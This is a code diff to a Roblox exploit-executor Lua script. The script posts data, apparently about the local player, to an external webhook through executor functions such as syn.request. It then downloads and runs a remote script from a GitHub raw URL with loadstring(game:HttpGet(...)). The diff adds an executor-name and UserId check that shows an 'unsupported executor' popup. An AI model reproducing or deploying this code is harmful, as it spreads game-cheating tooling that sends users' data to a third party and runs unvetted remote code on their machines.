@@ -20,7 +20,17 @@ local headers = { ["content-type"] = "application/json" }
 local request = http_request or request or HttpPost or syn.request
 request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 
+if webhookcheck == "Kid with shit exploit" and not (LPR.UserId==2236295191) then
+game:GetService('StarterGui'):SetCore("SendNotification", {
+	Title = 'unsupported executor';
+	Text = 'Script does not like this';
+	Icon = "rbxassetid://14899955386";
+	Duration = 3.4028235e+38; 
+	Callback = b; 
+	Button1 = 'Close';
 
+});
+else
 	local HTTP_ = game:GetService('HttpService')
 	local LPR = game:GetService('Players').LocalPlayer
 	local url =
@@ -34,4 +44,4 @@ request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 	local request = http_request or request or HttpPost or syn.request
 	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/bluefox%20script.lua"))();
-
+end
